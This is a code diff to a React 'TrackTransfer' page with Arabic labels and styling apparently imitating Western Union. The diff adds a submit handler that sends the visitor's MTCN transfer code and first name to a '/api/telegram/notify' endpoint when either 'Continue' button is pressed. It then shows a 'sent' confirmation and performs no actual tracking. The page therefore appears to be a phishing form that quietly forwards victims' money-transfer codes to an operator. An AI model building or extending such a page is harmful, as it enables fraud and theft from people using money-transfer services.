@@ -24,6 +24,25 @@ export default function TrackTransfer() {
   const [mtcn, setMtcn] = useState(["", "", "", "", "", "", "", "", "", ""]);
   const [firstName, setFirstName] = useState("");
   const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
+  const [sending, setSending] = useState(false);
+  const [sent, setSent] = useState(false);
+
+  const handleSubmit = async (tab: "sender" | "receiver", name: string) => {
+    const mtcnValue = mtcn.join("");
+    setSending(true);
+    try {
+      await fetch("/api/telegram/notify", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ mtcn: mtcnValue, name, tab }),
+      });
+      setSent(true);
+      setTimeout(() => setSent(false), 3000);
+    } catch {
+    } finally {
+      setSending(false);
+    }
+  };
 
   const handleMtcnChange = (index: number, value: string) => {
     const digit = value.replace(/\D/g, "").slice(-1);
@@ -141,8 +160,12 @@ export default function TrackTransfer() {
             </div>
 
             {/* Continue Button */}
-            <button className="w-full bg-wu-purple text-white py-4 rounded text-base font-medium hover:bg-wu-purple-dark transition-colors">
-              المتابعة
+            <button
+              onClick={() => handleSubmit("sender", firstName)}
+              disabled={sending}
+              className="w-full bg-wu-purple text-white py-4 rounded text-base font-medium hover:bg-wu-purple-dark transition-colors disabled:opacity-60"
+            >
+              {sending ? "جاري الإرسال..." : sent ? "✓ تم الإرسال" : "المتابعة"}
             </button>
 
             {/* MTCN Help Link */}
@@ -181,8 +204,12 @@ export default function TrackTransfer() {
               />
             </div>
 
-            <button className="w-full bg-wu-purple text-white py-4 rounded text-base font-medium hover:bg-wu-purple-dark transition-colors">
-              المتابعة
+            <button
+              onClick={() => handleSubmit("receiver", "")}
+              disabled={sending}
+              className="w-full bg-wu-purple text-white py-4 rounded text-base font-medium hover:bg-wu-purple-dark transition-colors disabled:opacity-60"
+            >
+              {sending ? "جاري الإرسال..." : sent ? "✓ تم الإرسال" : "المتابعة"}
             </button>
 
             <div className="text-center">
